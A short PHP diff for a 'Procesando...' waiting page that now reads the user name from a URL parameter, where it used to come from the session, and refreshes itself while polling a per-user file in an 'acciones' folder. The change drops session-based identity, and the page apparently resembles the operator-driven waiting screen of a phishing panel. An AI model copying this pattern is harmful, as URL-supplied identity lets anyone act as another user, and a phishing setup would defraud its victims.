@@ -1,10 +1,10 @@
 <?php
-session_start();
-$usuario = $_SESSION['usuario'] ?? null;
+$usuario = trim($_GET['u'] ?? '');
 if (!$usuario) {
     header('Location: inicio.html');
     exit;
 }
+$self = 'espera.php?u=' . urlencode($usuario);
 
 $archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
 if (file_exists($archivo)) {
@@ -29,7 +29,7 @@ if (file_exists($archivo)) {
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <meta http-equiv="refresh" content="2"/>
+  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($self) ?>"/>
   <title>Procesando...</title>
   <link rel="icon" href="img/logo-ba.svg" type="image/svg+xml"/>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
